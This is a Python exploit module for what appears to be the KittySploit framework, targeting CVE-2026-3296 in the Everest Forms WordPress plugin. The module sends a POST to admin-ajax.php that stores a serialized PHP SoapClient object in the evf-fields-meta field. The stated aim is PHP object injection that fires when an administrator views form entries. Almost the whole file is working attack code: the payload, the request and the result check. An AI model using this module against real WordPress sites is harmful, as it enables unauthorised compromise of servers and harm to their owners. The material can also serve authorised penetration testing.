#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Everest Forms CVE-2026-3296 — submit serialized evf-fields-meta (admin trigger)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Everest Forms CVE-2026-3296 POI submit",
        "description": (
            "Stores PHP object injection payload in entry meta; executes when admin views entries."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-3296"],
        "tags": ["wordpress", "everest-forms", "poi", "cve-2026-3296"],
        "agent": {"approval_required": True},
    }

    path = OptString("/", "WordPress base path", required=False)
    form_id = OptString("1", "Everest form ID", required=False)
    serialized_meta = OptString(
        'O:10:"SoapClient":4:{s:3:"uri";s:4:"http";s:8:"location";s:4:"http";s:15:"_soap_version";i:1;s:13:"_proxy_host";N;}',
        "evf-fields-meta serialized object",
        required=False,
    )

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        resp = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "action": "evf_submit_form",
                "evf_id": (self.form_id or "1").strip(),
                "evf-field-1": "kittysploit-poi",
                "evf-fields-meta": (self.serialized_meta or "").strip(),
            },
            allow_redirects=False,
        )
        if resp and int(resp.status_code or 0) in (200, 302):
            print_success("Form entry submitted with serialized meta")
            print_status((resp.text or "")[:500])
            return True
        print_error("Submit failed")
        return False
